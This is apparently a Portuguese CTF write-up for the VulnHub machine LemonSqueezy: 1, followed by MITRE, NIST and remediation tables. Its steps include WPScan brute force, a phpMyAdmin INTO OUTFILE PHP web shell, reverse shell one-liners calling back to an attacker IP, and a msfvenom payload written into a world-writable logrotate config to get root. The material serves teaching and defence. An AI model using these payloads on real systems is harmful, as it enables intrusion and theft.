# LemonSqueezy: 1 — Quando a Vida Te Dá Más Configurações, Faça um Shell de Root

Bora rapaziada!! LemonSqueezy: 1 é uma máquina incrível que empacota uma cadeia de ataque surpreendentemente profunda em um único serviço web exposto. Tem enumeração WordPress, brute-force, credenciais escondidas em rascunhos de posts, escrita de web shell via phpMyAdmin SQL, e uma escalação de privilégios baseada em cron via configuração logrotate com permissão mundial de escrita. Cada passo aqui mapeia para uma técnica do mundo real, e a cadeia é satisfatoriamente limpa. Sem mentira, a escalação via logrotate sozinha já valeu essa máquina, mano.

Salve ao criador por um desafio criativo e bem estruturado em camadas.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | LemonSqueezy: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/lemonsqueezy-1,473/ |
| **Técnicas** | Enumeração com Nmap, brute-force de diretório web, enumeração de usuários WordPress, brute-force de senha WPScan, descoberta de credenciais em rascunho WordPress, web shell phpMyAdmin SQL INTO OUTFILE, entrega de reverse shell, escalação de privilégios via cron com configuração logrotate com permissão mundial de escrita |
| **CVEs** | CWE-521 (Requisitos de Senha Fracos: orange:ginger craqueável por brute-force), CWE-312 (Armazenamento em Texto Puro de Informação Sensível: credenciais em rascunho de post WordPress), CWE-89 (Neutralização Imprópria: MySQL INTO OUTFILE file write), CWE-732 (Atribuição Incorreta de Permissão: config /etc/logrotate.d/ com permissão mundial de escrita executada pelo cron root) |
| **Grupos APT** | FIN7: exploração documentada de WordPress e phpMyAdmin em ataques a setores de varejo e hospitalidade para acesso inicial; APT41: usa mecanismos de persistência baseados em cron em intrusões direcionadas ao Linux como parte de manutenção de acesso de longo prazo |

---

## Resumo do Ataque

```
nmap → apenas porta 80
  → dirb → /wordpress, /phpmyadmin
  → wpscan: usuários orange, lemon
  → brute-force orange: ginger
  → login admin WordPress: orange:ginger
  → Posts → rascunho → credencial em texto puro: nOt1n@wOrdl1st!
  → phpMyAdmin: orange:nOt1n@wOrdl1st!
  → SQL: SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php"
  → http://alvo/wordpress/backdoor.php?cmd=whoami → www-data
  → reverse shell: nc -e /bin/bash atacante 1234
  → python pty spawn + stty raw -echo
  → LinEnum.sh → /etc/crontab → logrotate a cada 2 min
  → ls -la /etc/logrotate.d/ → config logrotate com permissão mundial de escrita
  → payload reverso msfvenom → sobrescrever /etc/logrotate.d/logrotate
  → aguardar <2 min → callback root
  → cat /root/root.txt
```

---

## Metodologia

1. Varredura de portas: apenas porta 80 aberta
2. Enumeração de diretórios: descobrir /wordpress e /phpmyadmin
3. Enumeração de usuários WordPress e brute-force de senha com WPScan
4. Descoberta de credenciais em rascunho de post WordPress
5. Login phpMyAdmin com credenciais descobertas
6. MySQL INTO OUTFILE para escrever web shell PHP no web root
7. Executar web shell e entregar reverse shell
8. Estabilização de shell para acesso interativo
9. Enumeração automatizada com LinEnum para descobrir má configuração de cron
10. Exploração de config logrotate com permissão mundial de escrita para shell root

---

## Passo 1 — Reconhecimento

Identifique o host, depois escaneie:

```bash
sudo netdiscover
# Alvo: 192.168.1.105

nmap -A 192.168.1.105
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
```

Apenas porta 80. HTTP é a única superfície de ataque.

Adicione ao /etc/hosts se necessário:
```bash
echo "192.168.1.105 lemonsqueezy" >> /etc/hosts
```

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração de Diretórios

```bash
dirb http://192.168.1.105
gobuster dir -u http://192.168.1.105 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Encontrado:**
- `/wordpress` — instalação WordPress
- `/phpmyadmin` — painel de administração phpMyAdmin

Ambos são achados críticos. WordPress nos dá o caminho de enumeração de usuários. phpMyAdmin nos dá o caminho de escrita de arquivo.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivo e Diretório

---

## Passo 3 — Enumeração de Usuários WordPress e Brute-Force

Enumere usuários WordPress:

```bash
wpscan --url http://192.168.1.105/wordpress -e u
```

**Usuários encontrados:** `orange`, `lemon`

Faça brute-force da senha para `orange`:

```bash
wpscan --url http://192.168.1.105/wordpress \
  -U orange \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc
```

**Resultado:** `orange` / `ginger`

**Nota real:** Enumeração de usuários WordPress via `?author=1` ou a API REST é uma técnica documentada que é desabilitada por endurecimento adequado. O WPScan automatiza isso. A senha `ginger` está no top 10.000 do rockyou.txt, por isso o brute-force funciona em minutos. O FIN7 usa rotineiramente enumeração estilo WPScan como primeiro passo contra alvos de e-commerce baseados em WordPress.

**MITRE ATT&CK:** T1589.001 — Coletar Informações de Identidade da Vítima: Credenciais; T1110.003 — Força Bruta: Password Spraying

---

## Passo 4 — Descoberta de Credenciais em Rascunho de Post WordPress

Faça login no admin WordPress em `http://192.168.1.105/wordpress/wp-admin/`:
- **Usuário:** `orange`
- **Senha:** `ginger`

Navegue até **Posts** e abra qualquer rascunho ou post existente no modo de edição. Leia o conteúdo do post cuidadosamente.

**Credencial encontrada no conteúdo do post:** `nOt1n@wOrdl1st!`

Esta é a senha phpMyAdmin para o usuário de banco de dados `orange`.

**Nota real:** Desenvolvedores e sysadmins frequentemente usam rascunhos de posts de CMS como bloco de notas temporário para credenciais, snippets de configuração e notas todo. Isso é um achado real em avaliações de WordPress de produção. O banco de dados WordPress armazena todo o conteúdo de posts incluindo rascunhos em texto puro, então qualquer acesso ao banco de dados (ou acesso a backup) expõe essas credenciais.

**MITRE ATT&CK:** T1552.001 — Credenciais Desprotegidas: Credenciais em Arquivos

---

## Passo 5 — Web Shell phpMyAdmin via SQL INTO OUTFILE

Faça login no phpMyAdmin em `http://192.168.1.105/phpmyadmin/`:
- **Usuário:** `orange`
- **Senha:** `nOt1n@wOrdl1st!`

Selecione o banco de dados WordPress. Abra a aba **SQL**.

Use a capacidade de escrita de arquivo do MySQL para colocar um web shell PHP no web root do WordPress:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php";
```

Verifique se o shell funciona:

```
http://192.168.1.105/wordpress/backdoor.php?cmd=whoami
```

Saída esperada: `www-data`

**Como INTO OUTFILE funciona:** A declaração `INTO OUTFILE` do MySQL escreve o resultado de uma query SELECT em um arquivo no sistema de arquivos do servidor. Quando o processo MySQL tem acesso de escrita ao web root e o privilégio `FILE` é concedido ao usuário do banco de dados, qualquer query SQL pode criar arquivos arbitrários, incluindo web shells PHP.

**Condições necessárias para funcionar:**
1. Usuário do banco de dados tem privilégio `FILE` (ou executa como root)
2. Processo MySQL pode escrever no diretório do web root
3. Caminho do web root é conhecido ou adivinhável

**MITRE ATT&CK:** T1505.003 — Componente de Software de Servidor: Web Shell; T1190 — Explorar Aplicação Voltada ao Público

---

## Passo 6 — Entrega de Reverse Shell

Inicie um listener no atacante:

```bash
nc -lvnp 1234
```

Acione um reverse shell pelo web shell:

```
http://192.168.1.105/wordpress/backdoor.php?cmd=nc+-e+/bin/bash+192.168.1.112+1234
```

Se `nc -e` não estiver disponível (muitas distribuições vêm com netcat sem `-e`), use:

```
# Reverse shell Python (URL-encodado):
http://192.168.1.105/wordpress/backdoor.php?cmd=python3+-c+'import+socket,os,pty;s=socket.socket();s.connect(("192.168.1.112",1234));[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)];pty.spawn("/bin/bash")'
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 7 — Estabilização do Shell

O shell netcat bruto não é interativo. Estabilize-o:

```bash
# No alvo:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# No atacante, pressione Ctrl+Z:
stty raw -echo; fg
# Pressione Enter duas vezes
```

Leia a flag de usuário:

```bash
cat ~/user.txt
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 8 — Enumeração Automatizada com LinEnum

Hospede LinEnum no atacante:

```bash
python3 -m http.server 8000
```

Baixe e execute no alvo:

```bash
cd /var/www/html/wordpress
wget http://192.168.1.112:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh | tee /tmp/linenum.txt
```

Revise o crontab:

```bash
cat /etc/crontab
```

Achado: um cron job executa `logrotate` a cada 2 minutos.

Verifique o diretório de configuração do logrotate:

```bash
ls -la /etc/logrotate.d/
```

**Achado crítico:** `/etc/logrotate.d/logrotate` tem permissão de escrita mundial (permissões: 777 ou 666).

**MITRE ATT&CK:** T1053.003 — Tarefa/Job Agendado: Cron

---

## Passo 9 — Escalação de Privilégios via Config logrotate com Permissão Mundial de Escrita

Gere um payload de reverse shell com msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.112 LPORT=4444 R
```

Copie o payload de saída (parece: `mkfifo /tmp/kqvh; nc ...`).

Sobrescreva a configuração logrotate no alvo com o payload:

```bash
echo '<cole output do msfvenom aqui>' > /etc/logrotate.d/logrotate
```

Inicie o listener de shell root no atacante:

```bash
nc -lvnp 4444
```

Aguarde até 2 minutos para o cron job executar. Quando o logrotate executa o arquivo de configuração como root, o payload aciona um callback de reverse shell root.

**Por que isso funciona:** O logrotate lê arquivos de configuração de `/etc/logrotate.d/`. Se qualquer um desses arquivos tiver permissão de escrita mundial, qualquer usuário pode sobrescrevê-lo com comandos arbitrários. Quando o cron executa o logrotate como root, esses comandos executam como root. Isso é CWE-732: um arquivo com permissão de escrita mundial executado por um processo privilegiado.

**Nota real:** Esse exato padrão de escalação foi encontrado em ambientes de produção em grandes organizações. A variante mais famosa é o exploit logrotate (CVE-2016-9560 e problemas relacionados), mas arquivos de configuração de cron com permissão de escrita mundial não requerem CVE, apenas permissões mal configuradas. O APT41 usa persistência baseada em cron em intrusões direcionadas ao Linux como mecanismo durável de persistência root.

**MITRE ATT&CK:** T1053.003 — Tarefa/Job Agendado: Cron; T1548.001 — Setuid e Setgid

---

## Passo 10 — Flag de Root

Após o callback do shell root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
cat root.txt
```

(☞ﾟヮﾟ)☞ Root. LemonSqueezy totalmente espremido. GG mano! Top demais essa máquina!

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | orange:ginger | Brute-force WPScan | Admin WordPress |
| Credencial | orange:nOt1n@wOrdl1st! | Rascunho de post WordPress | Login phpMyAdmin |
| Web shell | /wordpress/backdoor.php | MySQL INTO OUTFILE | Execução de comandos OS |
| Shell inicial | www-data | Reverse shell via backdoor.php | Acesso ao servidor web |
| Flag de usuário | user.txt | ~/user.txt | Prova nível usuário |
| Shell root | uid=0(root) | Config logrotate de cron com permissão mundial | Acesso total ao sistema |
| Flag de root | root.txt | /root/root.txt | Prova nível root |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | Senha WordPress orange:ginger craqueável por brute-force | Senhas fracas de CMS são trivialmente crackeadas; WPScan é gratuito e amplamente utilizado | Aplique senhas fortes; implemente bloqueio de conta; desabilite XML-RPC se não usado |
| 2 | Credenciais armazenadas em rascunho de post WordPress | Rascunhos de post de CMS são uma fonte consistente de descoberta de credenciais no mundo real | Nunca use rascunhos de CMS como bloco de notas; use um gerenciador de senhas ou solução de gestão de segredos |
| 3 | phpMyAdmin publicamente acessível | phpMyAdmin nunca deve ser voltado para a internet; acesso de banco de dados equivalente a admin permite criação de web shell | Vincule phpMyAdmin ao localhost; restrinja com auth HTTP ou allowlist de IP |
| 4 | MySQL INTO OUTFILE cria web shells | Privilégio FILE + web root gravável = criação de web shell de qualquer cliente SQL | Revogue privilégio FILE de todos os usuários de banco de dados de aplicação web; restrinja MySQL a web root somente leitura |
| 5 | Config /etc/logrotate.d/ com permissão mundial de escrita executada pelo cron root | Padrão clássico de escalação de privilégio em ambientes de container e VM | chown root:root /etc/logrotate.d/*; chmod 644 /etc/logrotate.d/*; audite cron com LinPEAS/LinEnum |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivo e Diretório | T1083 |
| Acesso a Credenciais | Credenciais | Força Bruta: Password Spraying | T1110.003 |
| Acesso a Credenciais | Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Execução | Execução | Componente de Software de Servidor: Web Shell | T1505.003 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Persistência | Persistência | Tarefa/Job Agendado: Cron | T1053.003 |
| Escalação de Privilégios | Escalação | Abuso de Setuid e Setgid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Aplique senhas fortes**: Habilite proteção contra brute-force no WordPress (plugin Limit Login Attempts ou Wordfence); desabilite XML-RPC se não necessário
2. **Audite posts WordPress para credenciais**: Faça grep em todas as tabelas post e postmeta para strings semelhantes a credenciais; implemente política de classificação de dados
3. **Restrinja acesso ao phpMyAdmin**: Vincule a `127.0.0.1` na configuração phpMyAdmin; adicione autenticação básica HTTP no Apache; implemente allowlist de IP
4. **Revogue privilégio MySQL FILE**: `REVOKE FILE ON *.* FROM 'orange'@'localhost';`; verifique se nenhum usuário de app web tem privilégios SUPER ou FILE
5. **Corrija permissões do logrotate**: `chown root:root /etc/logrotate.d/*; chmod 644 /etc/logrotate.d/*`; implemente auditorias regulares de permissões

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os painéis de admin voltados para web (phpMyAdmin, wp-admin) |
| Proteger | Controle de Acesso | Restringir phpMyAdmin ao localhost; desabilitar XML-RPC |
| Proteger | Segurança de Dados | Sem credenciais em conteúdo CMS; revogar privilégio FILE |
| Detectar | Anomalias | Alertar em queries INTO OUTFILE; monitorar mudanças de cron job; detectar web shells |
| Responder | Planejamento de Resposta | Remover web shell; rotacionar todas as credenciais; corrigir permissões logrotate |
| Recuperar | Planejamento de Recuperação | Auditar todo conteúdo WordPress para credenciais; reconstruir se acesso root foi alcançado |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-6 | Menor Privilégio | Privilégio MySQL FILE revogado; configs logrotate de propriedade do root |
| IA-5 | Gestão de Autenticadores | Senhas WordPress fortes; credenciais phpMyAdmin rotacionadas |
| CM-7 | Menor Funcionalidade | phpMyAdmin restrito ao localhost; XML-RPC desabilitado |
| CM-6 | Configurações de Configuração | Configs logrotate com permissão mundial de escrita: chmod 644 |
| SI-3 | Proteção contra Malware | HIDS para detectar criação de web shell e modificação de cron |

### CISA KEV

Criação de web shell MySQL INTO OUTFILE (padrão CWE-89/CWE-434) é referenciada no Alerta CISA AA21-008A documentando TTPs de atores de ameaça para comprometimento de aplicações web. O padrão de escalação de config cron com permissão mundial de escrita está alinhado com a orientação CISA sobre prevenção de escalação de privilégios Linux. As organizações devem aplicar a orientação CISA AA22-279A sobre interfaces de gerenciamento acessíveis pela internet incluindo phpMyAdmin.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Identidades e Credenciais | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Consciência Situacional (SITUATION) | Implementar Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Endurecimento de Configuração de Aplicação (phpMyAdmin somente localhost; revogar privilégio FILE)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (corrigir permissões logrotate; restringir cron)
- **D3-DQSA** — Análise de String de Query de Banco de Dados (detectar padrões INTO OUTFILE nos logs de query MySQL)
- **D3-FH** — Hashing de Arquivo (detectar criação de web shell no web root via monitoramento de integridade de arquivo)

---

## Considerações Finais

LemonSqueezy entrega uma cadeia de ataque limpa e em camadas que recompensa enumeração completa em cada passo. A credencial no rascunho de post WordPress é o tipo de achado que faz profissionais de segurança estremecer porque é tão comum em avaliações reais. A escalação via logrotate é um exemplo lindo de como uma única permissão de arquivo mal configurada pode entregar root para qualquer usuário local.

A máquina te ensina a olhar em todo lugar: enumeração de diretórios encontra phpMyAdmin, conteúdo de post revela credenciais, LinEnum encontra o cron job, e auditoria de permissões revela o arquivo com permissão mundial de escrita. Remova qualquer passo de enumeração e você trava a cadeia.

Sensacional essa máquina, véi!

Thanks guys!! (❍ᴥ❍ʋ)
